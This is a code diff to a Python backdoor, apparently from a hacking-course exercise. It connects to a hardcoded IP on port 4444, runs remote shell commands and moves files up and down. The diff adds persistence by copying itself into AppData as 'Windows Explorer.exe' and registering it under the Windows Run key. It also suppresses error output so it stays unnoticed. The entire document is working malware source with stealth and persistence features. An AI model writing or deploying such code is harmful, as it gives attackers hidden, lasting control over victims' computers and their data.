@@ -4,10 +4,19 @@ import subprocess
 import json
 import os
 import base64
+import sys
+import shutil
 class Backdoor:
     def __init__(self,ip,port):
+        # self.become_persistent()
         self.connection=socket.socket(socket.AF_INET,socket.SOCK_STREAM) #SOCK_STREAM is for TCP connection
         self.connection.connect((ip,port))
+
+    def become_persistent(self):
+        evil_file_location=os.environ['appdata']+'\\Windows Explorer.exe'
+        if not os.path.exists(evil_file_location):
+            shutil.copyfile(sys.executable,evil_file_location) #if python file, __file__ instead of sys.executable
+            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v update /t REG_SZ /d "'+evil_file_location+'"',shell=True) #add to registry
 
     def reliable_send(self,data):
         json_data=json.dumps(data)
@@ -36,13 +45,15 @@ class Backdoor:
             return '[+] Upload successful'
 
     def execute_system_command(self,command):
-        return subprocess.check_output(command,shell=True)
+        DEVNULL=open(os.devnull,'wb')  #Devnull is a special file that discards all data written to it
+        return subprocess.check_output(command,shell=True, stderr=DEVNULL, stdin=DEVNULL)
+        # return subprocess.check_output(command,shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL) #python3
     
     def execute_command(self,command):
         try:
             if command[0]=='exit':
                 self.connection.close()
-                exit()
+                sys.exit()
             elif command[0]=='cd' and len(command)>1:
                 return self.change_directory(command[1])
             elif command[0]=='download':
@@ -61,7 +72,11 @@ class Backdoor:
             command=self.reliable_receive()
             command_result=self.execute_command(command)  
             self.reliable_send(command_result)
-            
 
-my_backdoor=Backdoor('192.168.209.138',4444)
-my_backdoor.run()
+
+#use  try except to not show error message when error occurs when connection is lost or not listening       
+try:
+    my_backdoor=Backdoor('192.168.209.138',4444)
+    my_backdoor.run()
+except Exception:
+    sys.exit()
